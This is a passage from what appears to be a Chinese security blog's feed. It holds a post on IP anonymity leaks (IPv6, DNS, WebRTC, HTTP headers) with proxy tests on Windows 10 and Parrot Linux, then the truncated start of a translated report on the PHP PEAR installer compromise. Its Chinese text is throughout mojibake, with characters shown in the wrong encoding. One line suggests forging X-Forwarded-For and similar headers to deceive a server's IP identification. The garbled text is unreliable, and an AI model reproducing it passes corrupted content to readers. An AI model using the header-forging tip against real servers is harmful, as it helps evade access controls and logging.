å·²ç»ç”¨å°½ã€‚</p></blockquote><p>æˆ‘ä»¬ç°åœ¨å¸¸è¯´çš„IPåœ°å€å°±æ˜¯æŒ‡IPV4åœ°å€ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®webç«™ç‚¹æ—¶ï¼Œè¯·æ±‚å¤´ä¸­ä¼šåŒ…å«æˆ‘ä»¬çš„IPV4åœ°å€ï¼Œå› æ­¤å¯ä»¥è¢«æœåŠ¡å™¨è·å–åˆ°æˆ‘ä»¬çš„IPå¹¶è®°å½•è¿›å…¥æ—¥å¿—ã€‚</p><h3 id="IPV6æ³„éœ²"><a href="#IPV6æ³„éœ²" class="headerlink" title="IPV6æ³„éœ²"></a>IPV6æ³„éœ²</h3><blockquote><p>Internetåè®®ç‰ˆæœ¬6ï¼ˆIPv6ï¼‰æ˜¯Internetåè®®ï¼ˆIPï¼‰çš„æœ€æ–°ç‰ˆæœ¬ï¼ŒIPåè®®æ˜¯ä¸ºç½‘ç»œä¸Šçš„è®¡ç®—æœºæä¾›æ ‡è¯†å’Œå®šä½ç³»ç»Ÿå¹¶é€šè¿‡Internetè·¯ç”±æµé‡çš„é€šä¿¡åè®®ã€‚IPv6æ˜¯ç”±äº’è”ç½‘å·¥ç¨‹ä»»åŠ¡ç»„ï¼ˆIETFï¼‰å¼€å‘çš„ï¼Œç”¨äºè§£å†³é•¿æœŸä»¥æ¥çš„IPv4åœ°å€è€—å°½é—®é¢˜ã€‚</p><p>é™¤äº†æ›´å¤§çš„å¯»å€ç©ºé—´ä¹‹å¤–ï¼ŒIPv6è¿˜æä¾›å…¶ä»–æŠ€æœ¯ä¼˜åŠ¿ã€‚ç‰¹åˆ«æ˜¯ï¼Œå®ƒå…è®¸åˆ†å±‚åœ°å€åˆ†é…æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•æœ‰åŠ©äºè·¨Internetçš„<a href="https://en.wikipedia.org/wiki/Route_aggregation" target="_blank" rel="noopener">è·¯ç”±èšåˆ</a>ï¼Œä»è€Œé™åˆ¶äº†<a href="https://en.wikipedia.org/wiki/Routing_table" target="_blank" rel="noopener">è·¯ç”±è¡¨</a>çš„æ‰©å±•ã€‚æ‰©å±•å’Œç®€åŒ–äº†å¤šæ’­å¯»å€çš„ä½¿ç”¨ï¼Œå¹¶ä¸ºæœåŠ¡çš„æä¾›æä¾›äº†é¢å¤–çš„ä¼˜åŒ–ã€‚åœ¨åè®®çš„è®¾è®¡ä¸­å·²ç»è€ƒè™‘äº†è®¾å¤‡ç§»åŠ¨æ€§ï¼Œå®‰å…¨æ€§å’Œé…ç½®æ–¹é¢ã€‚</p><p>IPv6åœ°å€è¡¨ç¤ºä¸ºå…«ç»„ï¼Œæ¯ç»„å››ä¸ª<a href="https://en.wikipedia.org/wiki/Hexadecimal" target="_blank" rel="noopener">åå…­è¿›åˆ¶</a>æ•°å­—ï¼Œç»„ä»¥å†’å·åˆ†éš”ï¼Œä¾‹å¦‚2001ï¼š0db8ï¼š0000ï¼š0042ï¼š0000ï¼š8a2eï¼š0370ï¼š7334ï¼Œä½†å­˜åœ¨ç¼©å†™æ­¤å®Œæ•´ç¬¦å·çš„æ–¹æ³•ã€‚</p></blockquote><p>IPV6æ˜¯è¿˜æœªæ™®éä½¿ç”¨çš„ä¸€ç§åœ°å€ï¼Œç”¨äºè§£å†³é•¿æœŸä»¥æ¥çš„IPv4åœ°å€è€—å°½é—®é¢˜ï¼Œé€šè¿‡æ²¡æœ‰éšè—IPV6ä¹Ÿä¼šæ³„éœ²æˆ‘ä»¬ä¿¡æ¯ã€‚</p><h3 id="DNSæ³„éœ²"><a href="#DNSæ³„éœ²" class="headerlink" title="DNSæ³„éœ²"></a>DNSæ³„éœ²</h3><p>ä»€ä¹ˆæ˜¯DNS?</p><blockquote><p>DNSæˆ–åŸŸåç³»ç»Ÿç”¨äºå°†åŸŸåï¼ˆå¦‚<a href="http://www.astrill.comï¼‰è½¬æ¢ä¸ºæ•°å­—IPåœ°å€ï¼Œä¾‹å¦‚" target="_blank" rel="noopener">www.astrill.comï¼‰è½¬æ¢ä¸ºæ•°å­—IPåœ°å€ï¼Œä¾‹å¦‚</a> 123.98.12.1åœ¨äº’è”ç½‘ä¸Šç”¨äºå‘é€æ•°æ®åŒ…ã€‚ æ¯å½“æ‚¨çš„è®¡ç®—æœºéœ€è¦è”ç³»ç½‘ç»œä¸Šçš„æœåŠ¡å™¨æ—¶ï¼Œä¾‹å¦‚å½“æ‚¨åœ¨æµè§ˆå™¨ä¸­è¾“å…¥URLæ—¶ï¼Œæ‚¨çš„è®¡ç®—æœºä¼šè”ç³»DNSæœåŠ¡å™¨å¹¶è¯·æ±‚IPåœ°å€ã€‚å¤§å¤šæ•°äº’è”ç½‘æœåŠ¡æä¾›å•†ä¸ºä»–ä»¬çš„å®¢æˆ·åˆ†é…ä¸€ä¸ªDNSæœåŠ¡å™¨ï¼Œå®ƒä»¬ç”¨äºæ§åˆ¶å’Œè®°å½•æ‚¨çš„äº’è”ç½‘æ´»åŠ¨ã€‚</p></blockquote><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå³ä½¿è¿æ¥åˆ°åŒ¿åç½‘ç»œï¼Œæ“ä½œç³»ç»Ÿä»å°†ç»§ç»­ä½¿ç”¨å…¶é»˜è®¤DNSæœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯ç”±åŒ¿åç½‘ç»œåˆ†é…ç»™æ‚¨è®¡ç®—æœºçš„åŒ¿åDNSæœåŠ¡å™¨ã€‚è¿™è¢«ç§°ä¸ºæ³„æ¼ã€‚DNSæ³„æ¼æ˜¯ä¸»è¦çš„éšç§å¨èƒï¼Œå› ä¸ºåŒ¿åç½‘ç»œå¯èƒ½ä¼šåœ¨ç§äººæ•°æ®æ³„éœ²çš„åŒæ—¶æä¾›é”™è¯¯çš„å®‰å…¨æ„Ÿã€‚</p><p>å½“æ‚¨çš„DNSè¯·æ±‚è¢«æ³„éœ²æ—¶ï¼Œå‘é€åˆ°/ä»ç½‘ç«™å‘é€çš„å®é™…æ•°æ®å°†ä¸è¢«æ•è·ã€‚ä½†å®ƒä»ç„¶å¯ä»¥å‘çªƒå¬è€…æä¾›å…³äºæ‚¨è®¿é—®çš„ç½‘ç«™çš„è¶³å¤Ÿä¿¡æ¯ã€‚å®ƒä¹Ÿä¸ºDNSç—…æ¯’æ‰“å¼€é—¨æˆ·ï¼Œå¯ç”¨äºé’“é±¼æ”»å‡»(DNSåŠ«æŒ)ã€‚</p><h3 id="WEBRTCæ³„éœ²"><a href="#WEBRTCæ³„éœ²" class="headerlink" title="WEBRTCæ³„éœ²"></a>WEBRTCæ³„éœ²</h3><blockquote><p>ä»€ä¹ˆæ˜¯WEBRTCï¼Ÿ</p><p>WebRTCï¼ˆWeb Real-Time Communicationï¼‰æ˜¯ä¸€ä¸ªæ”¯æŒç½‘é¡µæµè§ˆå™¨è¿›è¡Œå®æ—¶è¯­éŸ³å¯¹è¯æˆ–è§†é¢‘å¯¹è¯çš„æŠ€æœ¯ï¼Œæ˜¯è°·æ­Œ2010å¹´ä»¥6820ä¸‡ç¾å…ƒæ”¶è´­Global IP Solutionså…¬å¸è€Œè·å¾—çš„ä¸€é¡¹æŠ€æœ¯ã€‚2011å¹´5æœˆè°·æ­Œå¼€æ”¾äº†WebRTCçš„æºä»£ç ï¼Œåœ¨è¡Œä¸šå†…å¾—åˆ°äº†å¹¿æ³›çš„æ”¯æŒå’Œåº”ç”¨ã€‚</p></blockquote><p>å³ä½¿æ‚¨æ­£åœ¨ä½¿ç”¨ VPNï¼Œä¹Ÿä¼šå‡ºç°å¤šä¸ªå¯ä»¥æ³„æ¼ IP åœ°å€çš„â€œæ„æƒ³ä¸åˆ°çš„é”™è¯¯â€ã€‚å®ƒè¢«ç§°ä¸º WebRTCï¼ˆWeb å®æ—¶é€šä¿¡ï¼‰æ³„æ¼ã€‚</p><p>WebRTC å…è®¸æµè§ˆå™¨å†…éƒ¨çš„å®æ—¶é€šä¿¡ã€‚è¿™å¾ˆæ–¹ä¾¿ï¼Œä½†ä¹Ÿæœ‰ä¸€ä¸ªç¼ºç‚¹ã€‚å³ä½¿æ‰“å¼€äº†VPNï¼ŒWebRTC ä¹Ÿèƒ½é»˜è®¤æ³„æ¼æ‚¨çš„çœŸå®åœ°å€ã€‚WebRTC åè®®é€šè¿‡è®¾è®¡å®ç°æ­¤ç›®çš„ï¼Œå³ä½¿æ˜¯æœ€å¥½çš„ VPN ä¹Ÿæ— æ³•å§‹ç»ˆä¿æŠ¤è‡ªå·±çš„ä¿¡æ¯ä¸è¢«æ³„éœ²ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœä½¿ç”¨é»˜è®¤å¯ç”¨ WebRTC çš„æµè§ˆå™¨ï¼Œåˆ™é‡‡å–å¿…è¦çš„é¢„é˜²æªæ–½è¿™ä¸€ç‚¹ååˆ†é‡è¦ã€‚åœ¨é€‰æ‹©çš„æµè§ˆå™¨ä¸­æœç´¢å¦‚ä½•å…³é—­ WebRTCï¼Œæˆ–æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨å¯å®‰è£…ç”¨æ¥ç¦ç”¨ WebRTC çš„ WebRTC é˜»æ­¢æ’ä»¶ã€‚è¯·è®°ä½ï¼Œç¦ç”¨ WebRTC å¯èƒ½ä¼šå¯¼è‡´éƒ¨åˆ†ç½‘ç«™ï¼ˆå¦‚ Google Hangoutsï¼‰æ— æ³•æ­£å¸¸å·¥ä½œï¼Œå› æ­¤æ‚¨å¯èƒ½éœ€è¦åœ¨ç‰¹å®šæƒ…å†µä¸‹å¯ç”¨å®ƒã€‚</p><pre class=" language-payload"><code class="language-payload">Firefoxæµè§ˆå™¨ç¦ç”¨WebRTCçš„æ–¹æ³•æ˜¯ï¼šåœ¨æµè§ˆå™¨ä¸Šè¾“å…¥ï¼šabout:configã€‚ä¹‹åæœç´¢ï¼šmedia.peerconnection.enabledã€‚æ‰¾åˆ°å®ƒååŒå‡»ï¼Œå°†å…¶æ”¹æˆ false å³å¯ã€‚Chromeæµè§ˆå™¨ç¦ç”¨WebRTCçš„æ–¹æ³•æ˜¯ï¼šåœ¨Chromeåº”ç”¨å•†åº—é‡Œï¼Œå®‰è£…ä¸€ä¸ªåä¸ºWebRTC Leak Preventçš„æ‰©å±•ï¼Œç„¶åé€‰æ‹© Use my Porxy server(if present) å³å¯ã€‚</code></pre><h3 id="HTTPheaderæ³„éœ²"><a href="#HTTPheaderæ³„éœ²" class="headerlink" title="HTTPheaderæ³„éœ²"></a>HTTPheaderæ³„éœ²</h3><p>httpè¯·æ±‚æ•°æ®åŒ…ä¸­çš„<code>header</code>:</p><pre class=" language-html"><code class="language-html">GET / HTTP/1.1Host: www.4399.comConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh,en-US;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6Cookie: home4399=yes; UM_distinctid=169050f7793431-0062d73fb17ef-b79183d-144000-169050f7794319; CNZZDATA30039538=cnzz_eid%3D1853484585-1550564275-%26ntime%3D1550564275If-None-Match: W/"5c6b5dba-2a86c"If-Modified-Since: Tue, 19 Feb 2019 01:36:58 GMT</code></pre><p>å¯è§ï¼Œé€šè¿‡<code>header</code>ä¸­çš„<code>Accept-Language</code>,<code>User-Agent</code>æ³„éœ²äº†ä¸€äº›ä¿¡æ¯ï¼Œå¦‚ï¼šæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ä¸­æ–‡å’Œè‹±æ–‡ï¼Œç”¨æˆ·è¯¦ç»†UAä¿¡æ¯ç­‰ç­‰ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>X-Forwarded-For</code>,<code>X-Client-IP</code>,<code>X-Real-IP</code>,<code>X-Remote-IP</code>ç­‰è¯·æ±‚å±æ€§ä¼ªé€ IPä»è€Œéª—è¿‡æœåŠ¡å™¨çš„IPè¯†åˆ«ã€‚</p><h2 id="IPåŒ¿åæ€§æµ‹è¯•"><a href="#IPåŒ¿åæ€§æµ‹è¯•" class="headerlink" title="IPåŒ¿åæ€§æµ‹è¯•"></a>IPåŒ¿åæ€§æµ‹è¯•</h2><p>æˆ‘ä»¬æ¥ä¸‹æ¥åŸºäºwindows10å’Œparrot linuxå¹³å°ä»£ç†è¿›è¡ŒIPåŒ¿åæ€§æµ‹è¯•ï¼Œä»£ç†è½¯ä»¶æ˜¯æœ€æ™®é€šçš„<code>å°é£æœº(ssr)</code>ï¼Œå€¼å¾—ä¸€æçš„æ˜¯<code>Electronç‰ˆå°é£æœº</code>è¿˜ä¸é”™ï¼Œè·¨å¹³å°ã€‚</p><blockquote><p>ä»€ä¹ˆæ˜¯Parrot linux?</p><p>Parrot Security OSï¼ˆç®€ç§°ä½œã€ŒParrorSecã€æˆ–ã€ŒParrotï¼ˆé¹¦é¹‰ï¼‰ã€ï¼‰æ˜¯ä¸€ä¸ªåŸºäº Debian é¢å‘å®‰å…¨çš„ GNU/<a href="https://www.linuxprobe.com/" target="_blank" rel="noopener">Linux</a> å‘è¡Œç‰ˆã€‚å®ƒæä¾›äº†è¯¸å¤šç”¨äºå®‰å…¨æµ‹è¯•ã€æ•°å­—å–è¯ã€è½¯ä»¶å¼€å‘åŠéšç§é˜²æŠ¤çš„ä¸“ä¸šå·¥å…·ã€‚</p><p>Parrotä¸kaliç±»ä¼¼ï¼Œä½†æ¯”kaliå¤šå¾ˆå¤šå·¥å…·ã€‚åœ¨æˆ‘ç›®å‰ä½¿ç”¨çš„æƒ…å†µçœ‹æ¥ï¼ŒåŒç­‰é…ç½®ä¸‹Parrotè¦æ¯”kaliç¾è§‚æµç•…ã€‚</p></blockquote><p>ä½¿ç”¨ä»¥ä¸‹ä¸‰ä¸ªç½‘å€è¿›è¡ŒåŒ¿åæ€§æ£€æµ‹ï¼š    </p><ul><li><a href="https://www.astrill.com/zh/vpn-leak-test" target="_blank" rel="noopener">https://www.astrill.com/zh/vpn-leak-test</a></li><li><a href="https://whoer.net/zh" target="_blank" rel="noopener">https://whoer.net/zh</a></li><li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li></ul><p>é€šè¿‡æµ‹è¯•ç›´è§‚åœ°æ˜¾ç°å‡ºä¸åŒå¹³å°ï¼Œä¸åŒæƒ…å†µä¸‹çš„åŒ¿åç¨‹åº¦ï¼Œä»è€Œå¾—åˆ°å…¶å·®åˆ«ã€‚</p><h3 id="Windows-10å¹³å°"><a href="#Windows-10å¹³å°" class="headerlink" title="Windows 10å¹³å°"></a>Windows 10å¹³å°</h3><p>åœ¨æˆ‘çš„ç‰©ç†æœº<code>windows 10</code>æœ¬åœ°å¯ç”¨<code>å°é£æœº</code>ä¹‹åï¼Œæˆ‘ä»¬åˆ†åˆ«ä»å‡ ä¸ªæµ‹è¯•å¹³å°è·å¾—äº†IPåŒ¿åæ€§æµ‹è¯•ç»“æœï¼š</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200332.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200512.png" alt=""></p><p><code>ceye.io</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219193744.png" alt=""></p><p>é€šè¿‡ä¼ªé€ httpheaderä¸­çš„<code>x-real-ip</code>æˆ‘ä»¬å¯ä»¥ç»™è‡ªå·±åŠ ä¸Šä¸€å±‚ä¼ªè£…ï¼Œä½†æ˜¯å¹¶ä¸èƒ½é€ƒè¿‡æ£€æµ‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219194704.png" alt=""></p><p>ç”±ä»¥ä¸Šä¸‰ä¸ªç»“æœå¯ä»¥äº†è§£åˆ°ï¼Œå•çº¯åœ¨win10ä¸Šä½¿ç”¨å°é£æœºä»£ç†æ—¶ï¼Œastrillå’Œwhoerå¹³å°çš„ç»“æœå…±åŒåæ˜ å‡ºäº†DNSå’ŒWEBRTCçš„æ³„éœ²ï¼Œä»¥åŠé¡µé¢è¯­è¨€ï¼Œå½“åœ°æ—¶é—´ç­‰ä¿¡æ¯ã€‚è€Œceyeçš„ç»“æœæ›´æ˜¯ç›´æ¥å¾—åˆ°äº†æˆ‘ä»¬çš„çœŸå®IPï¼Œä»…å‡­ä¸Šè¿°ä¿¡æ¯å·²ç»å¯ä»¥ç²¾ç¡®çŸ¥é“æˆ‘æ˜¯å“ªä¸ªæ‘çš„äººäº†(å¼€ä¸ªç©ç¬‘hhh)ï¼Œå› æ­¤åœ¨win10ä¸Šå°é£æœºçš„åŒ¿åæ€§å ªå¿§ã€‚</p><h3 id="Parrot-Linuxå¹³å°"><a href="#Parrot-Linuxå¹³å°" class="headerlink" title="Parrot Linuxå¹³å°"></a>Parrot Linuxå¹³å°</h3><p>åœ¨æˆ‘çš„è™šæ‹Ÿæœº<code>Parrot Linux</code>å¯ç”¨<code>å°é£æœº</code>ä¹‹åï¼Œæˆ‘ä»¬åˆ†åˆ«ä»å‡ ä¸ªæµ‹è¯•å¹³å°è·å¾—äº†IPåŒ¿åæ€§æµ‹è¯•ç»“æœï¼š</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195503.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195626.png" class="lazyload"></p><p><code>ceye.io</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195409.png" class="lazyload"></p><p>ç”±ä»¥ä¸Šä¸‰ä¸ªç»“æœå¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰å‡ºç°ä¸æˆ‘æ‰€åœ¨åœ°æœ‰å…³çš„ä¿¡æ¯ï¼Œæ£€æµ‹åˆ°çš„IPä¹Ÿä¸æ˜¯æˆ‘çš„çœŸå®IP(117.170.**<em>.\</em>**)ï¼Œè€Œæ˜¯ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œæ²¡æœ‰å‡ºç°DNSå’ŒWEBRTCæ³„éœ²ï¼Œå› è€Œå¯ä»¥çœ‹å‡º<code>Parrot linux</code>ä½œä¸ºä¸€ä¸ªé¢å‘å®‰å…¨æµ‹è¯•çš„linuxå‘è¡Œç‰ˆçš„åŒ¿åæ€§æ˜¯ååˆ†ä¹‹é«˜çš„ï¼Œç›¸å¯¹äºwin10åŒ¿åæ€§è¦æé«˜äº†ä¸å°‘ã€‚</p><h3 id="ä»¥Parrotä½œä¸ºè·³æ¿ï¼Œä¸ºwin10ä»£ç†"><a href="#ä»¥Parrotä½œä¸ºè·³æ¿ï¼Œä¸ºwin10ä»£ç†" class="headerlink" title="ä»¥Parrotä½œä¸ºè·³æ¿ï¼Œä¸ºwin10ä»£ç†"></a>ä»¥Parrotä½œä¸ºè·³æ¿ï¼Œä¸ºwin10ä»£ç†</h3><p>æ—¢ç„¶Parrotçš„åŒ¿åæ€§æ¯”è¾ƒå¥½ï¼Œé‚£æˆ‘ä»¬æŠŠparrotä½œä¸ºè·³æ¿ï¼ˆparrotä¸Šçš„å°é£æœºå…è®¸å±€åŸŸç½‘è¿æ¥ï¼‰ï¼Œç”¨win10è¿æ¥è¿è¡Œåœ¨parrotä¸Šçš„å°é£æœºä»£ç†ï¼Œä¼šæœ‰ä»€ä¹ˆç»“æœå‘¢ï¼Ÿ</p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219201252.png" class="lazyload"></p><p>ceye.ioå’Œastrillæ£€æµ‹æ˜¯æ­£å¸¸çš„ï¼Œæ²¡æœ‰æ³„éœ²ä¿¡æ¯ï¼Œä½†æ˜¯ä»whoer.netçš„ç»“æœçœ‹æ¥ï¼šæ³„éœ²äº†æ—¶åŒºï¼Œè¯­è¨€ç­‰ä¿¡æ¯ã€‚æœ€å…³é”®çš„æ˜¯WEBRTCç›´æ¥æ³„éœ²å‡ºäº†æˆ‘ä»¬çš„çœŸå®IPåœ°å€å’Œå†…ç½‘åœ°å€ã€‚</p><blockquote><p>Parrot OSä¸­è‡ªå¸¦Torç½‘ç»œï¼Œå’ŒåŒ¿åæ¨¡å¼ï¼Œä»¥ä¸Šæµ‹è¯•å‡åœ¨æœªå¼€å¯Torç½‘ç»œå’ŒåŒ¿åæ¨¡å¼æƒ…å†µä¸‹æµ‹è¯•ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå•çº¯åœ°ä½¿ç”¨Parrotè¿˜æ˜¯å¾ˆé¦™å¾ˆåŒ¿åçš„ï¼</p></blockquote><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>å½“ä»Šçš„ç§‘æŠ€å‘å±•è¿…é€Ÿï¼Œéšç§ä¿¡æ¯ä¹Ÿæ˜¾å¾—è¶Šæ¥è¶Šé‡è¦ï¼Œé€šè¿‡ä¸€éƒ¨åˆ†çœŸå®çš„è››ä¸é©¬è¿¹ï¼Œå°±å¯èƒ½è¿˜åŸå‡ºç²¾å‡†çš„ä¿¡æ¯æ¨¡å‹ã€‚IPV6æ³„éœ²ï¼ŒDNSæ³„éœ²ï¼ŒWEBRTCæ³„éœ²ï¼ŒHTTPheaderæ³„éœ²éƒ½å¯èƒ½å¯¼è‡´ä½ åœ¨ç½‘ç»œä¸Šçš„åŒ¿åæ€§é™ä½ï¼Œå¯èƒ½å¯¹äºæ™®é€šäººæ¥è¯´ï¼Œè¿™åªæ˜¯æ— å…³ç´§è¦çš„äº‹æƒ…ï¼Œä½†å¯¹äºè¯¸ä½å®‰å…¨ä»ä¸šè€…æ¥è¯´ï¼Œå…¶ä¸­åˆ©å¼Šä¸ç”¨å¤šè¨€ã€‚</p><blockquote><p>æ³¨æ˜: <a href="https://mp.weixin.qq.com/s/Otk44j7UNbT_FX9mXq6o4Q" target="_blank" rel="noopener">æ­¤æ–‡ç« é¦–å‘äºå®‰æ’ç½‘ç»œç©ºé—´å®‰å…¨è®²æ­¦å ‚å…¬ä¼—å·</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
            <tag> IPåŒ¿åæ€§ </tag>
            
            <tag> ParrotOS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php_pear_was_attacked</title>
      <link href="/2019/01/31/php-pear-was-attacked/"/>
      <url>/2019/01/31/php-pear-was-attacked/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><blockquote><p>è¯‘æ–‡å£°æ˜ï¼š</p><p>æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« åŸä½œè€…<a href="https://thehackernews.com/p/authors.html" target="_blank" rel="noopener">Mohit Kumar</a>ï¼Œæ–‡ç« æ¥æºï¼š<a href="https://thehackernews.com/2019/01/php-pear-hacked.html" target="_blank" rel="noopener">https://thehackernews.com/2019/01/php-pear-hacked.html</a></p></blockquote><h1 id="PHP-PEARç½‘ç«™è¢«é»‘ä¸”å…¶å®˜æ–¹è½¯ä»¶åŒ…ç®¡ç†å™¨è¢«æ¶æ„ç¯¡æ”¹"><a href="#PHP-PEARç½‘ç«™è¢«é»‘ä¸”å…¶å®˜æ–¹è½¯ä»¶åŒ…ç®¡ç†å™¨è¢«æ¶æ„ç¯¡æ”¹" class="headerlink" title="PHP PEARç½‘ç«™è¢«é»‘ä¸”å…¶å®˜æ–¹è½¯ä»¶åŒ…ç®¡ç†å™¨è¢«æ¶æ„ç¯¡æ”¹"></a>PHP PEARç½‘ç«™è¢«é»‘ä¸”å…¶å®˜æ–¹è½¯ä»¶åŒ…ç®¡ç†å™¨è¢«æ¶æ„ç¯¡æ”¹</h1><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130104752.png" alt=""></p><blockquote><p>å°å¿ƒï¼å¦‚æœæ‚¨åœ¨è¿‡å»6ä¸ªæœˆå†…ä»PHPå®˜æ–¹ç½‘ç«™ä¸‹è½½äº†PHP PEARåŒ…ç®¡ç†å™¨ï¼Œæˆ‘ä»¬åªèƒ½å¾ˆé—æ†¾å¯¹æ‚¨è¯´æ‚¨çš„æœåŠ¡å™¨å¯èƒ½å·²ç»æˆä¸ºè‚‰é¸¡ã€‚</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸Šå‘¨ï¼ŒPEARçš„ç»´æŠ¤äººå‘˜å‘ç°æœ‰äºº<strong>æ¶æ„æ›¿æ¢äº†åŸæ¥çš„PHP PEARåŒ…ç®¡ç†å™¨ï¼ˆgo-pear.pharï¼‰</strong>ï¼Œä¸”é»‘å®¢åœ¨æ ¸å¿ƒPEARæ–‡ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨äº†ç¯¡æ”¹åçš„ç‰ˆæœ¬ï¼Œåœ¨æ­¤ä¹‹åç»´æŠ¤äººå‘˜è¿…é€Ÿå…³é—­äº†PEARçš„å®˜æ–¹ç½‘ç«™ï¼ˆpear-php.netï¼‰ã€‚</p><p>å°½ç®¡PEARå¼€å‘äººå‘˜è¿˜åœ¨åˆ†ææ¶æ„ç¨‹åºåŒ…ï¼Œä½†å›¢é˜Ÿåœ¨2019å¹´1æœˆ19æ—¥è¿…é€Ÿå‘å¸ƒçš„å®‰å…¨å…¬å‘Šè¯å®ï¼Œè¢«é»‘å®¢å…¥ä¾µçš„ç½‘ç«™æœåŠ¡æ”¾ç½®äº†å—æ¶æ„ä»£ç æ±¡æŸ“çš„å®‰è£…æ–‡ä»¶è‡³å°‘åŠå¹´ä¹‹ä¹…ï¼Œå¯æƒ³è€ŒçŸ¥æœ‰å¤šå°‘äººä¸‹è½½äº†è¢«æ±¡æŸ“çš„å®‰è£…åŒ…ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130105824.png" alt=""></p><h2 id="PHP-PEARæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#PHP-PEARæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="PHP-PEARæ˜¯ä»€ä¹ˆï¼Ÿ"></a>PHP-PEARæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>PHPæ‰©å±•å’Œåº”ç”¨ç¨‹åºå­˜å‚¨åº“ï¼ˆPEARï¼‰æ˜¯ä¸€ä¸ªç¤¾åŒºé©±åŠ¨çš„æ¡†æ¶å’Œåˆ†å‘ç³»ç»Ÿï¼Œå®ƒä½¿å¾—ä»»ä½•äººéƒ½å¯ä»¥æœç´¢å’Œä¸‹è½½ä½¿ç”¨PHPç¼–ç¨‹è¯­è¨€ç¼–å†™çš„å…è´¹åº“ã€‚è¿™äº›å¼€æºåº“ï¼ˆæˆ–è®¸ç§°ä¹‹ä¸ºè½¯ä»¶åŒ…æ›´ä¸ºæ°å½“ï¼‰å…è®¸å¼€å‘äººå‘˜åœ¨å…¶é¡¹ç›®å’Œç½‘ç«™ä¸­è½»æ¾æ·»åŠ å…¶ä»–åŠŸèƒ½ï¼ŒåŒ…æ‹¬èº«ä»½éªŒè¯ï¼Œç¼“å­˜ï¼ŒåŠ å¯†ï¼ŒWebæœåŠ¡ç­‰ç­‰ã€‚</p><p>å½“æ‚¨ä¸‹è½½ç”¨äºUnix / Linux / BSDç³»ç»Ÿçš„PHPè½¯ä»¶æ—¶ï¼ŒPEARä¸‹è½½ç®¡ç†å™¨ï¼ˆgo-pear.pharï¼‰å·²é¢„å…ˆå®‰è£…ï¼Œè€ŒWindowså’ŒMac OS Xç”¨æˆ·åœ¨å¿…è¦çš„æ—¶ä¾¯éœ€æ‰‹åŠ¨å®‰è£…è¯¥ç»„ä»¶ã€‚</p><p>ç”±äºè®¸å¤šç½‘ç»œæ‰˜ç®¡å…¬å¸ï¼ˆåŒ…æ‹¬å…±äº«æ‰˜ç®¡æœåŠ¡æä¾›å•†ï¼‰ä¹Ÿå…è®¸å…¶ç”¨æˆ·å®‰è£…å’Œè¿è¡ŒPEARï¼Œå› æ­¤è¿™ç§æœ€æ–°çš„å®‰å…¨æ¼æ´å¯èƒ½ä¼š<strong>å½±å“å¤§é‡ç½‘ç«™åŠå…¶è®¿é—®è€…</strong>ã€‚</p><h2 id="PEAR-å›¢é˜Ÿå£°æ˜"><a href="#PEAR-å›¢é˜Ÿå£°æ˜" class="headerlink" title="PEAR å›¢é˜Ÿå£°æ˜"></a>PEAR å›¢é˜Ÿå£°æ˜</h2><blockquote><p>â€œå¦‚æœæ‚¨åœ¨è¿‡å»å…­ä¸ªæœˆä¹‹å†…å·²ç»ä¸‹è½½äº†è¿™ä¸ª<code>go-pear.phar</code>ï¼Œé‚£ä¹ˆæ‚¨åº”è¯¥ä»<code>GitHubï¼ˆpear / 